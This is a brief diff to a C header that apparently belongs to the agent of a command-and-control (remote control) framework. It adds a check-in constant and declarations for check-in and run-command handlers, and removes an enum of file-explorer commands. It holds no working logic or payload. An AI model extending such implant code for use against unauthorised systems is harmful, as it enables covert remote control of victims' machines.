@@ -2,6 +2,7 @@
 #include <Package.h>
 
 #define BLACKOUT_ERROR           0x099
+#define BLACKOUT_CHECKIN         0x055
 #define BLACKOUT_DEBUG           0x066
 
 #define COMMAND_REGISTER         0x100
@@ -24,15 +25,6 @@
 
 #define COMMAND_OUTPUT           0x200
 
-enum {
-    PWD,
-    LS,
-    CD,
-    RM,
-    CAT,
-    MKDIR
-} Explorer;
-
 typedef struct
 {
     INT ID;
@@ -41,3 +33,11 @@ typedef struct
 
 // Functions
 VOID CommandDispatcher();
+
+VOID CommandCheckin(
+    _In_ PPARSER Parser
+);
+
+VOID CommandRun(
+    _In_ PPARSER Parser
+);
